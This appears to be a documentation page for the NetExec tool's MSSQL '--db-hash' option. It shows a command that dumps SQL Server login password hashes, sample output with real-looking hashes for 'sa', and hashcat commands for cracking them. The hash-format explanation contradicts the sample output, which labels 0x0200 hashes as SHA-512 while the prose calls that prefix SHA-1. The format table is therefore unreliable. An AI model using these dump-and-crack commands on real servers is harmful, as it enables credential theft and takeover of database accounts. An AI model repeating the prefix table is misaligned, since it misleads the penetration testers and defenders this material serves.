```
description: Dumb MSSQL databases local hashes
```

Using the --db-hash option allows dumping MSSQL databases local hashes as well as the algorithm used to hash them:

```bash
nxc mssql <ip> -u user -p pass --db-hash 
MSSQL       192.168.56.72   54830  SRV22            [*] Windows Server 2022 Build 20348 (2022 RTM 16.0.1000) (name:NAME) (domain:FQDN.local) (EncryptionReq:True) 
MSSQL       192.168.56.72   54830  SRV22            [+] FQDN\user:pass (Pwn3d!)
MSSQL       192.168.56.72   54830  SRV22            [*] Dumping local database users' hashes
MSSQL       192.168.56.72   54830  SRV22            [*] Enumerated logins
MSSQL       192.168.56.72   54830  SRV22            Login Name      Hash type  Hash
MSSQL       192.168.56.72   54830  SRV22            ----------      ---------- --------------
MSSQL       192.168.56.72   54830  SRV22            RecoveryAdmin   SHA-512    0200856c934b19bd8b5ce750bb93402b75cfda0ac00da83fead49c6cbf084558888b40cffeef2f7d4d254075e461c68e85ca72e2bcb0319403465806ccf23e06fb9ac517a0c8
MSSQL       192.168.56.72   54830  SRV22            sa              SHA-512    02001bee31ce178cf9ed0faff6d1d3a6def73decbf5abb24bed8294355d436885213ff63813951b4abf93d0389ee4b4e39362685eb9ce06e910485e696fe82c49d532525b247
```

SQL Server stores login password hashes using versioned formats identified by a 4-byte prefix. The 0x0100 format, used by SQL Server 2000, is based on SHA-1 with a salt and can be cracked with Hashcat mode 131; 0x0200, used by SQL Server 2005, also uses SHA-1 with a salt and corresponds to Hashcat mode 132; 0x0300, introduced with SQL Server 2012, uses SHA-512 with a salt and corresponds to Hashcat mode 1731 (also used for SQL Server 2014); 0x0400 is the newer PBKDF2-based format introduced for SQL Server 2025 and is not represented by the legacy Hashcat MSSQL modes.

For the legacy formats, Hashcat can be invoked as follows:

```bash
# MSSQL 2000 - 0x0100
hashcat -m 131 hashes.txt wordlist.txt

# MSSQL 2005 - 0x0200
hashcat -m 132 hashes.txt wordlist.txt

# MSSQL 2012/2014 - 0x0300
hashcat -m 1731 hashes.txt wordlist.txt
```
